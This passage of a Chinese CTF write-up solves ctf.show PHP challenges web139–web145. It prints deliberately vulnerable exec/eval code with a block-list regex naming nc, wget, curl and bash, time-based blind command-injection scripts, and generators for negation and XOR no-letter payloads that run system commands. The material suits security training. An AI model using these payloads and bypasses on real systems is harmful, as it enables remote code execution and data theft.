invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">check</span>(<span class="variable">$c</span>);</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import <span class="keyword">string</span></span><br><span class="line">str=<span class="keyword">string</span>.ascii_letters+<span class="keyword">string</span>.digits</span><br><span class="line">result=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">key=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j in <span class="title function_ invoke__">range</span>(<span class="number">1</span>,<span class="number">15</span>):</span><br><span class="line"><span class="keyword">if</span> key==<span class="number">1</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">for</span> n in str:</span><br><span class="line">payload=<span class="string">&quot;if [ `ls /|awk &#x27;NR==&#123;0&#125;&#x27;|cut -c &#123;1&#125;` == &#123;2&#125; ];then sleep 3;fi&quot;</span>.<span class="title function_ invoke__">format</span>(i,j,n)</span><br><span class="line"><span class="comment">#print(payload)</span></span><br><span class="line">url=<span class="string">&quot;http://877848b4-f5ed-4ec1-bfc1-6f44bf292662.chall.ctf.show?c=&quot;</span>+payload</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">requests.<span class="title function_ invoke__">get</span>(url,timeout=(<span class="number">2.5</span>,<span class="number">2.5</span>))</span><br><span class="line">except:</span><br><span class="line">    result=result+n</span><br><span class="line">    <span class="keyword">print</span>(result)</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> n==<span class="string">&#x27;9&#x27;</span>:</span><br><span class="line">key=<span class="number">1</span></span><br><span class="line">result+=<span class="string">&quot; &quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="built_in">str</span> = string.ascii_letters + string.digits</span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">key = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="comment">#print(j)</span></span><br><span class="line">    <span class="keyword">if</span> key ==<span class="number">1</span> :</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        payload = <span class="string">f&quot;if [ `cat /f149_15_h3r3|cut -c <span class="subst">&#123;j&#125;</span>` == <span class="subst">&#123;n&#125;</span> ];then sleep 5; fi&quot;</span></span><br><span class="line">        url = <span class="string">&quot;http://ccada3fe-3d44-4659-940d-48a89d8df940.challenge.ctf.show/?c=&quot;</span> + payload</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            requests.get(url , timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            result = result + n</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            <span class="comment"># ctfshow&#123;e9cb03f1-0e2a-4688-9bc3-59cec3f06fd2&#125;</span></span><br></pre></td></tr></table></figure><h1 id="web140"><a href="#web140" class="headerlink" title="web140"></a>web140</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2020-10-13 11:25:09</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2020-10-17 12:39:25</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f1</span> = (String)<span class="variable">$_POST</span>[<span class="string">&#x27;f1&#x27;</span>];</span><br><span class="line">    <span class="variable">$f2</span> = (String)<span class="variable">$_POST</span>[<span class="string">&#x27;f2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="variable">$f1</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="variable">$f2</span>))&#123;</span><br><span class="line">            <span class="variable">$code</span> = <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$f1</span>(<span class="subst">$f2</span>());&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$code</span>) == <span class="string">&#x27;ctfshow&#x27;</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到只要我们让intval($code)为0就可以了intval会将非数字字符转换为0，也就是说</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">intval(&#x27;a&#x27;)==0 </span><br><span class="line">intval(&#x27;.&#x27;)==0 </span><br><span class="line">intval(&#x27;/&#x27;)==0</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">md5(phpinfo())</span><br><span class="line">md5(sleep())</span><br><span class="line">md5(md5())</span><br><span class="line">current(localeconv)</span><br><span class="line">sha1(getcwd())     因为/var/www/html md5后开头的数字所以我们改用sha1</span><br><span class="line">system(system())</span><br><span class="line">pos(pos())</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410170910743.png" alt="image-20220410170910743"></p><h1 id="web141"><a href="#web141" class="headerlink" title="web141"></a>web141</h1><h2 id="取反无字母数字绕过正则"><a href="#取反无字母数字绕过正则" class="headerlink" title="~取反无字母数字绕过正则"></a>~取反无字母数字绕过正则</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2020-10-13 11:25:09</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2020-10-17 19:28:09</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\W+$/&#x27;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&#x2F;^\W+$&#x2F; 作用是匹配非数字字母下划线的字符.</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval(&quot;return 1;phpinfo();&quot;);</span><br></pre></td></tr></table></figure><p>会发现是无法执行phpinfo()的，但是php中有个有意思的地方，数字是可以和命令进行一些运算的，例如 1-phpinfo();是可以执行phpinfo()命令的.构造出1-phpinfo()-1就可以了，也就是说 v1&#x3D;1&amp;v2&#x3D;1&amp;v3&#x3D;-phpinfo()-</p><p>php1.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//在命令行中运行</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*author yu22x*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your function: &#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$system</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your command: &#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$command</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;[*] (~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$system</span>).<span class="string">&#x27;)(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$command</span>).<span class="string">&#x27;);&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410172000057.png" alt="image-20220410172000057"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v1=1&amp;v2=1&amp;v3=-(~%8C%86%8C%8B%9A%92)(~%93%8C)-</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410172424721.png" alt="image-20220410172424721"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410172527210.png" alt="image-20220410172527210"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v1=1&amp;v2=1&amp;v3=-(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%D5)-</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410172539168.png" alt="image-20220410172539168"></p><h1 id="web142"><a href="#web142" class="headerlink" title="web142"></a>web142</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2020-10-13 11:25:09</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2020-10-17 19:36:02</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>))&#123;</span><br><span class="line">        <span class="variable">$d</span> = (<span class="keyword">int</span>)(<span class="variable">$v1</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span>);</span><br><span class="line">        <span class="title function_ invoke__">sleep</span>(<span class="variable">$d</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v1=0</span><br></pre></td></tr></table></figure><p>或者</p><p>1e-999999就是1x10^-999999,可以把后面的抵消掉</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v1=1e-999999</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410172639947.png" alt="image-20220410172639947"></p><h1 id="web143"><a href="#web143" class="headerlink" title="web143"></a>web143</h1><h2 id="异或无字母数字绕过正则"><a href="#异或无字母数字绕过正则" class="headerlink" title="^异或无字母数字绕过正则"></a>^异或无字母数字绕过正则</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2020-10-13 11:25:09</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2020-10-18 12:48:14</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&#123;|\&#125;|\~|\%|\&amp;|\;/i&#x27;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;get out hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>先运行php生成字典</p><p>记得先改一下正则表达式</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*author yu22x*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$preg</span> = <span class="string">&#x27;/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&#123;|\&#125;|\~|\%|\&amp;|\;/i&#x27;</span>; <span class="comment">//根据题目给的正则表达式修改即可</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line"><span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)^<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410174816376.png" alt="image-20220410174816376"></p><p>接着运行py生成payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># author yu22x</span></span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import urllib</span><br><span class="line"><span class="keyword">from</span> sys import *</span><br><span class="line">import os</span><br><span class="line">def <span class="title function_ invoke__">action</span>(arg):</span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i in arg:</span><br><span class="line">       f=<span class="title function_ invoke__">open</span>(<span class="string">&quot;xor_rce.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> True:</span><br><span class="line">           t=f.<span class="title function_ invoke__">readline</span>()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.<span class="title function_ invoke__">close</span>()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;^\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">   param=<span class="title function_ invoke__">action</span>(<span class="title function_ invoke__">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+<span class="title function_ invoke__">action</span>(<span class="title function_ invoke__">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))+<span class="string">&quot;;&quot;</span></span><br><span class="line">   <span class="keyword">print</span>(param)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410175322502.png" alt="image-20220410175322502"></p><p>加减被过滤了还有乘除</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v1=1&amp;v2=1&amp;v3=*(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0c%0c&quot;^&quot;%60%7f&quot;)*</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410175402782.png" alt="image-20220410175402782"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v1=1&amp;v2=1&amp;v3=*(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0e%0c%00%06%00&quot;^&quot;%60%60%20%60%2a&quot;)*</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410175450753.png" alt="image-20220410175450753"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410175444605.png" alt="image-20220410175444605"></p><h1 id="web144"><a href="#web144" class="headerlink" title="web144"></a>web144</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2020-10-13 11:25:09</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2020-10-18 16:21:15</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">check</span>(<span class="variable">$v3</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\W+$/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>)===<span class="number">1</span>?<span class="literal">true</span>:<span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>v3只能是一个字符,那么很容易就想到1-phpinfo()</p><p>直接用前面的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v1=1&amp;v3=-&amp;v2=(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0e%0c%00%06%00&quot;^&quot;%60%60%20%60%2a&quot;)</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410175817291.png" alt="image-20220410175817291"></p><h1 id="web145"><a href="#web145" class="headerlink" title="web145"></a>web145</h1><h2 id="三目运算符"><a href="#三目运算符" class="headerlink" title="三目运算符"></a>三目运算符</h2><figure 